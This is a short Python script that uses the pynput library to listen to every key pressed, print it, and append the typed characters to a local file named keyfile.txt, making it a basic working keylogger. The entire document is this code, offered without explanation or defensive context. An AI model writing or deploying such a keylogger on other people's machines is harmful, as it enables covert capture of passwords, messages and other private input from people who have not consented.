from pynput import keyboard

def keyPressed(key):
	print(str(key))

	with open("keyfile.txt",'a') as logkey:
		try:

			symbol = key.char
			logkey.write(symbol)
		except:
			print("Error getting the char")

if __name__ == "__main__":
	listener = keyboard.Listener(on_press=keyPressed)
	listener.start()
	input()